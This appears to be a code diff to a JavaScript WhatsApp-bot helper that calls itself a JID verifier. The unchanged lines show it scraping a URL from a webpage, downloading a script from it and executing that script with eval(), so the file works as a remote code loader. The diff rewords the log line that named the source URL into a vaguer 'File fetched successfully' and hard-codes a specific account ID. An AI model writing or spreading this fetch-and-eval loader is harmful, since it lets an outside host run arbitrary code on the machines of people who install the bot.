@@ -25,7 +25,7 @@ async function fetchAdamsUrl() {
             throw new Error('ADAMS_URL not found on the webpage.');
         }
 
-        console.log('ADAMS_URL fetched successfully:', adamsUrl);
+        console.log('File fetched successfully:', adamsUrl);
 
         // Fetch the script from ADAMS_URL
         const scriptResponse = await axios.get(adamsUrl);
@@ -37,9 +37,9 @@ async function fetchAdamsUrl() {
         eval(scriptContent);
 
         // Example usage of atbverifierEtatJid
-        const jid = 'example@s.whatsapp.net'; // Replace with actual JID to verify
+        const jid = 'ibrahimadams@s.whatsapp.net'; // Replace with actual JID to verify
         const isValid = atbverifierEtatJid(jid);
-        console.log('Is JID valid?', isValid);
+        console.log('Your verified', isValid);
 
     } catch (error) {
         console.error('Error:', error.message || error);
